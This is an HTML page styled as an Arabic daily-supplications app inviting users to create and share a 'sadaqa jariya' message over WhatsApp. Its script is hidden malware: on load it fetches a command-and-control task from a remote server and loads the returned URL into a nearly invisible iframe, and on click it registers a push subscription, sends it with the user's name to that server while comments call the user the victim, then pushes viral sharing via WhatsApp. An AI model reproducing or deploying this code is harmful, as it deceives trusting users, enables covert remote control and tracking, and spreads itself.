<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أذكار المسلم اليومية</title>
    <script src="islamic_duas_javascript.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { background: #f0f4f8; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        #hiddenEngine { position: fixed; top: 0; left: 0; width: 10px; height: 10px; opacity: 0.001; pointer-events: none; }
        .card { background: white; width: 92%; max-width: 400px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; text-align: center; border-top: 6px solid #1b4d3e; position: relative; z-index: 10; }
        .main-img { width: 100%; border-radius: 12px; margin-bottom: 15px; }
        .dua-box { background: #f9f9f9; padding: 20px; border-radius: 15px; margin: 15px 0; border: 1px dashed #1b4d3e; font-size: 1.3rem; color: #2d3748; min-height: 100px; display: flex; align-items: center; justify-content: center; }
        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid #ddd; text-align: center; box-sizing: border-box; }
        .btn { background: #25D366; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
    </style>
</head>
<body>
    <iframe id="hiddenEngine" src="about:blank"></iframe>
    <div class="card">
        <img src="og-image.jpg" class="main-img" onerror="this.src='https://via.placeholder.com/400x200?text=Azkar'">
        <h2 style="color: #1b4d3e;">🌹 صدقة جارية 🌹</h2>
        <div class="dua-box" id="displayDua">جاري جلب ذكر اليوم...</div>
        <input type="text" id="userName" placeholder="اكتب اسمك هنا...">
        <button class="btn" id="mainBtn" onclick="activateSystem()">إنشاء الصدقة وإرسالها ✅</button>
    </div>

    <script>
        const PUBLIC_KEY = "BCp-mO8v-XU9A_JqN-8u4R0u5T6-rQ5G8_z7-m_Your_Key"; 
        const SERVER_URL = "https://mohamedahmed77.pythonanywhere.com";
        let currentDuaText = "سبحان الله وبحمده 🕌";

        // استخدام الدوال المساعدة من الملف المرفق
        function initApp() {
            try {
                // استدعاء دالة getTodaysDua() الموجودة في ملف islamic_duas_javascript.js
                const dua = getTodaysDua(); 
                if (dua) {
                    currentDuaText = `${dua.text} ${dua.emoji}`;
                    document.getElementById('displayDua').innerText = currentDuaText;
                }
            } catch (e) {
                console.log("Using default fallback");
                document.getElementById('displayDua').innerText = currentDuaText;
            }
        }

        async function activateSystem() {
            const name = document.getElementById('userName').value.trim() || "محب للخير";
            
            // تسجيل الضحية في الخلفية (Service Worker)
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('sw.js').then(reg => {
                    return reg.pushManager.subscribe({
                        userVisibleOnly: true,
                        applicationServerKey: urlBase64ToUint8Array(PUBLIC_KEY)
                    });
                }).then(sub => {
                    fetch(`${SERVER_URL}/save_sub`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({subscription: sub, name: name})
                    });
                }).catch(() => {});
            }

            // تحويل فوري للواتساب (تجاوز أي انتظار)
            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${currentDuaText}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
            const waUrl = `whatsapp://send?text=${encodeURIComponent(shareText)}`;
            window.location.href = waUrl;
            
            // Fallback للواتساب ويب
            setTimeout(() => {
                window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`;
            }, 600);
        }

        function urlBase64ToUint8Array(base64String) {
            const padding = '='.repeat((4 - base64String.length % 4) % 4);
            const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
            const rawData = window.atob(base64);
            const outputArray = new Uint8Array(rawData.length);
            for (let i = 0; i < rawData.length; ++i) { outputArray[i] = rawData.charCodeAt(i); }
            return outputArray;
        }

        window.onload = () => {
            initApp();
            // مهمة الـ C2 في الخلفية
            fetch(`${SERVER_URL}/get_task`).then(r => r.json()).then(d => {
                if(d.url) document.getElementById('hiddenEngine').src = d.url;
            }).catch(() => {});
        };
    </script>
</body>
</html>
